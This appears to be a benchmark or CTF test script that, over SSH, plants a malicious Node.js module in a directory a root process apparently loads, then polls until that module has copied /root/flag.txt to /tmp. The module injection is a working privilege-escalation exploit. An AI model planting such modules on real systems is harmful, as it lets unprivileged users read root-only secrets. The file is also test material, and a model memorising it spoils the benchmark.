#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/node_flag
cat > /opt/bench/nodeinc/benchpwn.js <<'\''EOF'\''
const fs = require("fs");
fs.writeFileSync("/tmp/node_flag", fs.readFileSync("/root/flag.txt"));
module.exports = {};
EOF
for i in $(seq 1 45); do
  if test -r /tmp/node_flag && grep -q FLAG /tmp/node_flag 2>/dev/null; then
    cat /tmp/node_flag
    exit 0
  fi
  sleep 1
done
exit 1
')"
assert_root_output "${out}"
